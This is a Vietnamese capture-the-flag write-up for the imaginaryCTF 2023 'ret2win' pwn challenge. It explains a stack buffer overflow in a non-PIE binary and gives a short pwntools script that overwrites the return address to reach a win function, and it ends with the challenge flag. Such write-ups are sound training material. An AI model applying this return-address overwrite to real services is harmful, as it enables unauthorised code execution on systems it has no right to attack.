# RET2WIN

## Mô tả

- Mô tả của challenge:
</br>![img](/imaginaryCTF%202023/Pwn/ret2win/assets/des.png)

## Các thông tin

- Chall cho chúng ta 2 files, bao gồm 1 file ELF64 và 1 file source code C.

- Khi mình mở file code C lên đọc thì thấy code khá đơn giản, chỉ là một lỗi buffer overflow nhỏ và một hàm win thực hiện lệnh `cat flag.txt` trên shell.
</br>![img](/imaginaryCTF%202023/Pwn/ret2win/assets/source.png)

- Mình sẽ kiểm tra các lớp bảo vệ của file xem có thể sử dụng luôn địa chỉ của hàm win trong file binary hay không.
</br>![img](/imaginaryCTF%202023/Pwn/ret2win/assets/checksec.png)

## Ý tưởng

- PIE không được bật, vậy nghĩa là ta chỉ cần ghi đè đến khi nào tới được địa chỉ RET của hàm main trên stack, rồi sau đó ghi đè RET của main bằng địa chỉ của hàm win là xong.

- Tuy nhiên thì nếu ta cho thẳng địa chỉ của hàm win vào sẽ không được, điều này là do lời gọi đến hàm system yêu cầu stack phải được align.

- Do đó mình sẽ chỉ lấy địa chỉ bắt đầu của hàm system thôi (bắt đầu từ đoạn truyền đối số cho rdi, ...)
</br>![img](/imaginaryCTF%202023/Pwn/ret2win/assets/win.png)

## Script

```python
from pwn import *

p = remote("ret2win.chal.imaginaryctf.org", 1337)

win = 0x401182

payload = b"a"*0x48 + p64(win)
p.sendline(payload)
p.interactive()
```

## Kết quả

![img](/imaginaryCTF%202023/Pwn/ret2win/assets/res.png)

> Flag: ictf{r3turn_0f_th3_k1ng?}
